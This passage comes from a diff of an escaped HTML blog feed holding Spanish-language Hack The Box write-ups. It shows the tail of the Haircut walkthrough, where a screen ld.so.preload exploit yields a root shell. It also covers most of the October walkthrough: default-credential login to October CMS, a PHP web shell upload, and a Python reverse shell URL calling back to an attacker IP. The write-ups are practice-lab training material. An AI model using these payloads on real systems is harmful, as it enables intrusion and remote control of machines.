+www-data@haircut:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;screen &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; ld.so.preload &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a/tmp/libhax.so&quot;&lt;/span&gt;
+www-data@haircut:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /tmp/rootshell 
+&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 16816 Oct 19 04:36 /tmp/rootshell
+www-data@haircut:/etc&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+www-data@haircut:/etc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/tmp/rootshell
+&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
+root
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="PHP" /><category term="Injection" /><summary type="html">Resolución de la máquina Haircut en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Stratosphere</title><link href="http://localhost:4000/htb-stratosphere/" rel="alternate" type="text/html" title="Hack The Box Stratosphere" /><published>2021-10-12T00:00:00-05:00</published><updated>2021-10-12T00:00:00-05:00</updated><id>http://localhost:4000/htb-stratosphere</id><content type="html" xml:base="http://localhost:4000/htb-stratosphere/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-stratosphere/banner-stratosphere.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;stratosphere&quot;&gt;Stratosphere&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.64.&lt;/p&gt;
@@ -4573,585 +5028,4 @@ bash-4.3#
         diff &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$old_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;lt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-E&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;command|procmon&quot;&lt;/span&gt;
         &lt;span class=&quot;nv&quot;&gt;old_process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$new_process&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="Bash" /><category term="Process" /><category term="Enumeration" /><summary type="html">Archivo ProcMon para el monitoreo de procesos ejecutamos a intervalos regulares de tiempo</summary></entry><entry><title type="html">Hack The Box October</title><link href="http://localhost:4000/htb-october/" rel="alternate" type="text/html" title="Hack The Box October" /><published>2021-09-21T00:00:00-05:00</published><updated>2021-09-21T00:00:00-05:00</updated><id>http://localhost:4000/htb-october</id><content type="html" xml:base="http://localhost:4000/htb-october/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/banner-october.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;october&quot;&gt;October&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.16.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.16
-PING 10.10.10.16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.16&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.16: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;63 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;140 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.16 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 139.771/139.771/139.771/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.16 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-20 21:39 CDT
-Initiating SYN Stealth Scan at 21:39
-Scanning 10.10.10.16 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 80/tcp on 10.10.10.16
-Discovered open port 22/tcp on 10.10.10.16
-Completed SYN Stealth Scan at 21:40, 26.91s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.16
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.30s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2021-09-20 21:39:45 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;27s
-Not shown: 65533 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;27.43 seconds
-           Raw packets sent: 131086 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.768MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 30 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.320KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬───────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼───────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.16
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,80
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 10.10.10.16 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-20 21:41 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.16
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: October CMS - Vanilla
-| http-methods: 
-|_  Potentially risky methods: PUT PATCH DELETE
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;16.53 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que se encuentra el servicio HTTP, por lo que ya sabemos que debemos de ver que tecnologías corren mediante el uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.16
-http://10.10.10.16 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.7], Cookies[october_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, HttpOnly[october_session], IP[10.10.10.16], Meta-Author[October CMS], PHP[5.5.9-1ubuntu4.21], Script, Title[October CMS - Vanilla], X-Powered-By[PHP/5.5.9-1ubuntu4.21]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Algo que nos llama la atención es el título &lt;strong&gt;October CMS - Vanilla&lt;/strong&gt; ya que hace referencia a un gestor de contenido. Investigando un poco, vemos que se trata de un CMS (gestor de contenido); por lo que es posible que tenga un panel de administracion asociado:&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://stackoverflow.com/questions/45815952/octobercms-how-to-open-admin-login-page&quot;&gt;stackoverflow.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que en el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/backend&lt;/code&gt; se debe encontrar el panel de adminsitración.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-panel.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y efectivamente, tenemos el panel de administración. Ahora, antes de tirar fuerza bruta o cualquier otra cosa, tenemos que ver si existen credenciales por defecto.&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name&quot;&gt;octobercms.com&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que comentan que las credenciales son &lt;em&gt;admin:admin&lt;/em&gt;; así que vamos a probarlas:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-admin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya estamos dentro del panel de administración del sitio web. Ahora debemos de buscar alguna forma de ingresar a la máquina víctima; si intentamos crear un archivo de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt;, vemos que no nos deja; por lo tanto, tenemos que validar que extensiones permite el servidor. En la parte superior izquierda vemos varias opciones, podemos ingresar a &lt;strong&gt;Media&lt;/strong&gt; y vemos algo curioso, un archivo de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php5&lt;/code&gt;; si lo seleccionamos vemos unas opciones del lado derecho y si le damos en &lt;strong&gt;&lt;em&gt;Click here&lt;/em&gt;&lt;/strong&gt;, nos abre el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dr.php5&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Así que podemos crearnos un archivo con extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php5&lt;/code&gt; y subirlo al servidor:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;k4mishell.php5
-───────┬───────────────────────────────────────────────────────────
-       │ File: k4mishell.php5
-───────┼───────────────────────────────────────────────────────────
-   1   │ &amp;lt;?php
-   2   │     &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; shell_exec&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;
-   3   │ ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Le damos en la opción &lt;strong&gt;&lt;em&gt;Click here&lt;/em&gt;&lt;/strong&gt;, se nos abre otra ventana en donde se encuentra nuestro archivo php. Ahora mediante la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd&lt;/code&gt; podemos ejecutar comandos a nivel de sistema.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-cmd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora debemos entablarnos una reverse shell a nuestra máquina de atacante. Probando las reverse shell de &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt;, vemos que &lt;strong&gt;Netcat&lt;/strong&gt; no nos deja, así que vamos por otras vías alternativas; como por ejemplo python. Antes de lanzar la reverse shell, vamos a validar si la máquina cuenta con python:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-october/october-python.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora si, lanzamos la reverse shell y nos ponemos en escucha por el puerto 443:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.16/storage/app/media/k4mishell.php5?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;python%20-c%20%27import%20socket,subprocess,os&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;socket.socket&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;socket.AF_INET,socket.SOCK_STREAM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s.connect&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;%2210.10.14.16%22,443&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%20os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%20os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;subprocess.call&lt;span class=&quot;o&quot;&gt;([&lt;/span&gt;%22/bin/sh%22,%22-i%22]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;%27
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.16] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.16] 49506
-/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
-$ whoami
-www-data
-$ 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No encontramos dentro de la máquina como el usuario &lt;strong&gt;www-data&lt;/strong&gt; y podemos visualizar la flag (user.txt). Como siempre, para trabajar más comodos, hacemos un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora nos queda escalar privilegios y enumeramos un poco el sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
-www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
-./bin/umount
-./bin/ping
-./bin/fusermount
-./bin/su
-./bin/ping6
-./bin/mount
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/openssh/ssh-keysign
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/bin/sudo
-./usr/bin/newgrp
-./usr/bin/pkexec
-./usr/bin/passwd
-./usr/bin/chfn
-./usr/bin/gpasswd
-./usr/bin/traceroute6.iputils
-./usr/bin/mtr
-./usr/bin/chsh
-./usr/bin/at
-./usr/sbin/pppd
-./usr/sbin/uuidd
-./usr/local/bin/ovrflw
-www-data@october:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos un archivo curioso que tiene permisos SUID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/ovrflw&lt;/code&gt;, que ya por el nombre nos hace referencia a &lt;em&gt;Buffer Overflow&lt;/em&gt; y al ejecutarlo vemos que nos pide ingresar una cadena de texto.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/ovrflw
-Syntax: /usr/local/bin/ovrflw &amp;lt;input string&amp;gt;
-www-data@october:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Validamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;randomize_va_space&lt;/code&gt; y vemos que tiene un 2; por lo que el &lt;strong&gt;&lt;em&gt;ASLR (Address Space Layout Randomization)&lt;/em&gt;&lt;/strong&gt; se encuentra activado; lo que dispone de forma aleatoria las posiciones del espacio de direcciones de las áreas de datos clave de un proceso, incluyendo la base del ejecutable y las posiciones de la pila, el &lt;em&gt;heap&lt;/em&gt; y las librerías.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@october:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space 
-2
